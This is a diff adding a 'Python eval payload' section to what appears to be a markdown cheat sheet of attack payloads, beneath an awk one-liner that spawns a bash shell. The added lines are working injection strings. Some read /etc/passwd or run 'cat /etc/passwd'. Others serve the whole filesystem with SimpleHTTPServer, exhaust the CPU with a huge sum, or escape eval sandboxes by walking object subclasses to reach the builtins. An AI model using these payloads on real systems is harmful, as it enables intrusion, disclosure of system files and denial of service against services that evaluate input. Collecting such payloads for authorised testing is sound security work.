@@ -65,3 +65,45 @@ Source : [https://twitter.com/ropnop/status/884928178048860160](https://twitter.
 ```bash
 awk 'BEGIN {system("/bin/bash")}'
 ```
+
+## Python eval payload
+
+```python
+print('THIS IS A PYTHON EVAL INTERPRETED OUTPUT')
+exit()
+sum(xrange(-999999999,99999999))
+ 
+file('/etc/passwd').read()
+open('/etc/passwd').read()
+__import__['fileinput'].input('/etc/passwd')
+__import__['os'].system('cat /etc/passwd')
+__import__['os'].popen('/etc/passwd', 'r').read()
+__import__['os'].system('cd /; python -m SimpleHTTPServer')
+ 
+print(file('/etc/passwd').read())
+print(open('/etc/passwd').read())
+print(__import__['fileinput'].input('/etc/passwd'))
+print(__import__['os'].system('cat /etc/passwd'))
+print(__import__['os'].popen('/etc/passwd', 'r').read())
+print(__import__['os'].system('cd /; python -m SimpleHTTPServer'))
+ 
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']('THIS IS A PYTHON EVAL INTERPRETED OUTPUT')
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['exit']()
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['sum']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['xrange'](-999999999,99999999))
+ 
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['file']('/etc/passwd').read()
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/etc/passwd').read()
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('fileinput').input('/etc/passwd')
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /etc/passwd')
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('/etc/passwd', 'r').read()
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cd /; python -m SimpleHTTPServer')
+ 
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['file']('/etc/passwd').read())
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/etc/passwd').read())
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('fileinput').input('/etc/passwd'))
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /etc/passwd'))
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('/etc/passwd', 'r').read())
+[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cd /; python -m SimpleHTTPServer'))
+```
+source : [https://www.floyd.ch/?p=584](https://www.floyd.ch/?p=584) 
+
